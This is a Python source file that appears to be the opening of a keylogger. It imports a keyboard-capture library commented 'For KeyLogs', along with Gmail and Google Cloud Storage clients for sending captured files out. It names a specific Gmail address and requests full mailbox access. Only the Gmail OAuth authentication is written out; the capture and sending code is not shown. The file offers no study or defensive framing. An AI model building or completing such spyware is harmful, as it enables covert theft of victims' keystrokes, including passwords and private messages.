import os #To interact with OS
import pickle #To convert Python Object to Stream type to store in file/database

#Gmail API Utils ->

from googleapiclient.discovery import build
from google_auth_oauthlib.flow import InstalledAppFlow
from google.auth.transport.requests import Request

#For Encoding/Decoding messages to base64 ->

from base64 import urlsafe_b64decode
from base64 import urlsafe_b64encode

#For dealing with attachment of MIME Type

from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage
from email.mime.audio import MIMEAudio
from email.mime.base import MIMEBase
from mimetypes import guess_type as guess_mime_type

from threading import Timer
from datetime import datetime
import keyboard #For KeyLogs

from google.cloud import storage #To send the file to google cloud storage

#Request for Full Access i.e., read, send, receive mails

SCOPES= ['https://mail.google.com/']
our_email= 'trekkerz13@gmail.com'

#Let's authenticate Gmail Api call using our OAuth tokens
def gmail_authenticate():
    creds= None

    #The file token.pickle stores the user's access and refreshes tokens, and is
    #created automatically when the authorization flow completes for the first time

    if os.path.exists("token.pickle"):
        with open("token.pickle", "rb") as token:
            creds= pickle.load(token)

    #If there aren't any valid creds available, make the user log in.        
    if not creds or not creds.valid:
        if creds and creds.expired and creds.refresh_token:
            creds.refresh(Request())
        else:
            flow= InstalledAppFlow.from_client_secrets_file('credentials.json', SCOPES)
            creds= flow.run_local_server(port=0)
        
        #Let's save the creds for the next run

        with open("token.pickle", "wb") as token:
            pickle.dump(creds, token)
    return build('gmail', 'v1',credentials=creds)

#Call the Gmail API Service
service= gmail_authenticate()

# Here, we are reading the credentials.json and saving it to token.pickle file 
# after authenticating with Google in your browser, 
# After which, we save the token, so that it doesn't require authentication for a second time.

